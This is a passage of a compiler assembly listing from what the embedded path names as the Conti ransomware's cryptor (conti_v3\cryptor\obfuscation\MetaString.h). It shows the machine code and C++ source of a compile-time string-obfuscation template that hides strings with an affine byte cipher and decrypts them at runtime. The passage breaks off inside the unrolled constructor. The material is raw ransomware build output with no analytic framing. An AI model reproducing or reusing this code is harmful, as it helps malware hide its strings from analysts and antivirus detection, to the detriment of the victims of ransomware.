_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 05	 imul	 eax, eax, 5
  0002d	83 c0 75	 add	 eax, 117		; 00000075H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 34	 cmp	 QWORD PTR i$1[rbp], 52	; 00000034H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ PROC ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv462 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
